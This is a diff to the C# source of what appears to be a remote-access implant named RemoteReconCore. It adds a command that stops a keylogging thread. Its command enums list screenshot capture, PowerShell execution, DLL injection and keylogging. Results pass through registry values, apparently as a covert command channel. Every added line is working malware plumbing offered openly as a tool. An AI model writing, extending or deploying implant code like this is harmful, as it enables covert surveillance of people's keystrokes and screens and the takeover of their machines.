@@ -115,6 +115,17 @@ namespace RemoteReconCore
                         command = new KeyValuePair<int, object>(0, "");
                         result = new KeyValuePair<int, string>(0, "");
                         break;
+                    case (int)Cmd.KeylogStop:
+#if DEBUG 
+                        Console.WriteLine("Writing Keylog stop command result");
+#endif
+                        rrbase.SetValue(resultkey, result.Key, RegistryValueKind.DWord);
+                        rrbase.SetValue(runkey, result.Value, RegistryValueKind.String);
+                        rrbase.SetValue(commandkey, 0);
+                        rrbase.SetValue(argumentkey, "");
+                        command = new KeyValuePair<int, object>(0, "");
+                        result = new KeyValuePair<int, string>(0, "");
+                        break;
                     default:
                         break;
                 }
@@ -186,6 +197,23 @@ namespace RemoteReconCore
                 else
                     result = new KeyValuePair<int, string>(0, Convert.ToBase64String(Encoding.ASCII.GetBytes("DllInject success")));
             }
+            else if ((int)Cmd.KeylogStop == command.Key)
+            {
+#if DEBUG
+                Console.WriteLine("Received keylog stop");
+#endif
+                try
+                {
+                    t.Abort();
+                    string msg = Convert.ToBase64String(Encoding.ASCII.GetBytes("Keylogging stopped"));
+                    result = new KeyValuePair<int, string>(0, msg);
+                }
+                catch (Exception e)
+                {
+                    string msg = Convert.ToBase64String(Encoding.ASCII.GetBytes(e.ToString()));
+                    result = new KeyValuePair<int, string>(7, msg);
+                }
+            }
         }
 
         public static int sleep = 5;
@@ -193,9 +221,10 @@ namespace RemoteReconCore
         public static byte[] mod;
         public static string modkey;
         public static string kkey;
-        public static KeyValuePair<int, object> command;
-        public static KeyValuePair<int, string> result;
+        private static KeyValuePair<int, object> command;
+        private static KeyValuePair<int, string> result;
         public static RegistryKey rrbase;
+        public static Thread t;
 
         public enum Result : int
         {
@@ -205,7 +234,8 @@ namespace RemoteReconCore
             ScreenShotFailed = 3,
             PSFailed = 4,
             RevertFailed = 5,
-            InjectDll = 6
+            InjectDllFailed = 6,
+            KeylogStopFailed = 7
         }
 
         public enum Cmd : int
@@ -216,7 +246,8 @@ namespace RemoteReconCore
             Screenshot = 3,
             PowerShell = 4,
             Revert = 5,
-            InjectDll = 6
+            InjectDll = 6,
+            KeylogStop = 7
         }
         
 
